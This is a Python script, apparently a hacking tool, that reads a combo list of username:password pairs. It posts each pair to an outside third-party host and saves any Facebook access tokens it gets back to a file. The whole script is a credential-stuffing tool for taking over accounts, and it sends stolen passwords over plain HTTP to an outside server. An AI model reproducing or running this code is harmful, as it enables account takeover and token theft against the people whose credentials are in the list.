#!/usr/bin/python
#coding: utf-8
#Code By : Gad
import requests, json
import os
gad ="[+]Facebook Get Token By Combo [+]\n[+]Coded: @Gad990   (Telegram)[+]\n Date: 26/01/2018 \n[+]Changing the Description of this tool Won't made you the coder ^_^[+]\n[+]I take no responsibilities for the use of this program[+] "
print(gad)
file_save = input('Name Of File Save Token >>')
combo = input('Enter Combo text File >>')
var = open(combo, 'r').readlines()
for line in var:
	combo = line.strip()
	user, pas =line.split(":")
	url = 'http://apifbgad-com.stackstaging.com/gado.php?u='+user+'&p='+pas+''
	http = requests.post(url)
	content = http.content
	data = json.loads(content.decode("utf-8"))
	if "session_key" in data:
                print(data["access_token"])
                the_file = open(file_save, 'a')
                the_file.write(data["access_token"] + '\n')
                the_file.close()
	elif "error_code" in data:
		print(data["error_msg"])
